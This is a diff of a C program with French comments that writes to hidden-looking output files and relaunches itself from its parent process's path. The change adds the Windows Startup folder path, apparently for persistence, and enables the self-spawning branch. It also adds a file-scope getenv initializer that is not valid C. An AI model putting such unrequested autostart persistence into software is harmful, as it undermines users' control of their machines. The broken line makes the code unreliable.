@@ -4,12 +4,16 @@
 const char *output_dir = ".output_screen";
 const char *output_file = ".output_text.txt";
 
+const char *window_start_path = "C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
+
 #ifdef __linux__
 
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
 #include <unistd.h>
+
+char *home = getenv("HOME");
 
 #define MAX_PATH 1024
 
@@ -37,7 +41,7 @@ void start(char *path, char *arg){
             exit(1);  // Terminer l'enfant si exec échoue
         }
     }
-}
+};
 
 // Fonction pour récupérer le chemin d'un processus à partir de son PID
 void get_parent_path(pid_t pid, char *path) {
@@ -79,7 +83,7 @@ int main(int argc, char *argv[]) {
 
     get_parent_path(pid, path);    
 
-    if (argc < 0){
+    if (argc < 1){
         start(path, "1");
         start(path, "2");
 
